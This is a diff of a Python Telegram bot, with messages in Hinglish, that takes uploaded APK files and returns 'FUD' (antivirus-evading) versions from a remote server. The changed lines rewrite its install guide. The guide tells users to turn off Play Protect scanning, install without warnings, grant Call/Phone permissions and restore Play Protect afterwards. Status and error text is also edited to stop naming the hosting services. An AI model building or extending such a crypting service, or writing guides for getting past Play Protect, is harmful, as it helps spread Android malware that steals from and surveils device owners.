@@ -4,7 +4,6 @@ import requests
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 
-# Logging setup
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -35,11 +34,12 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("📥 **APK bhej...**\n\nMain isko fud karke wapas dunga. (File attach karke bhej).", parse_mode='Markdown')
     elif query.data == "bypass":
         await query.edit_message_text("🛡️ **Play Protect Bypass Guide:**\n\n"
-                                      "1. Settings > Apps > Chrome/Telegram > Allow restricted settings.\n"
-                                      "2. APK install karte waqt 'More details' > 'Install anyway' dabana.\n"
-                                      "3. Agar block ho jaye, toh Play Protect scan off karke install karna.", parse_mode='Markdown')
+                                      "1. Play Store > Profile > Play Protect > Settings (Gear).\n"
+                                      "2. 'Scan apps with Play Protect' ko OFF kar do.\n"
+                                      "3. APK install karo (Bina kisi warning ke install hoga).\n"
+                                      "4. Install ke baad Play Protect wapas ON kar lena.", parse_mode='Markdown')
     elif query.data == "status":
-        await query.edit_message_text("✅ **Server Status:**\nRender Server: Online 🟢\nRailway Bot: Online 🟢\n\nSab kuch ready hai baby!", parse_mode='Markdown')
+        await query.edit_message_text("✅ **Server Status:**\nServer: Online 🟢\nBot: Online 🟢\n\nSab kuch ready hai baby!", parse_mode='Markdown')
 
 async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     doc = update.message.document
@@ -67,11 +67,14 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 caption=(
                     "✅ [■■■■■■■■■■] 100%\n\n"
                     "**FUD APK Ready Hai Baby!**\n\n"
+                    "**⚠️ IMPORTANT: Is APK ko install karne ke liye Play Protect OFF karna padega!**\n\n"
                     "**Install Karne Ka Tarika:**\n"
-                    "1. Settings > Apps > [Koi bhi purana app] > 'Allow restricted settings'.\n"
-                    "2. APK install karo.\n"
-                    "3. Play Protect aaye toh 'More details' > 'Install anyway' dabana.\n\n"
-                    "**Note:** Agar Play Protect ne block kiya, toh Play Store > Profile > Play Protect > Settings > Scan apps OFF kar dena. Install ke baad wapas ON kar lena."
+                    "1. Play Store kholo > Profile icon > **Play Protect** > Settings (Gear).\n"
+                    "2. **'Scan apps with Play Protect'** ko OFF kar do.\n"
+                    "3. Ab ye APK install karo. (Bina kisi warning ke seedha install hoga).\n"
+                    "4. Install ke baad jo permissions maange (Call/Phone), unko **Allow** karna.\n"
+                    "5. App home screen pe apne asli icon ke saath show hogi.\n"
+                    "6. Play Protect ko baad me wapas ON kar sakte ho."
                 ),
                 parse_mode='Markdown'
             )
@@ -87,12 +90,12 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 error_msg = error_msg[:200] + "..."
 
             await progress_msg.edit_text(
-                f"❌ **Render Server Error!**\n\nServer ne kaha:\n`{error_msg}`", 
+                f"❌ **Server Error!**\n\nServer ne kaha:\n`{error_msg}`", 
                 parse_mode='Markdown'
             )
             
     except requests.exceptions.Timeout:
-        await progress_msg.edit_text("❌ **Timeout Error!**\nRender server ne 5 minute me jawab nahi diya.")
+        await progress_msg.edit_text("❌ **Timeout Error!**\nServer ne 5 minute me jawab nahi diya.")
     except Exception as e:
         await progress_msg.edit_text(f"❌ **Error aaya:**\n`{str(e)}`", parse_mode='Markdown')
 
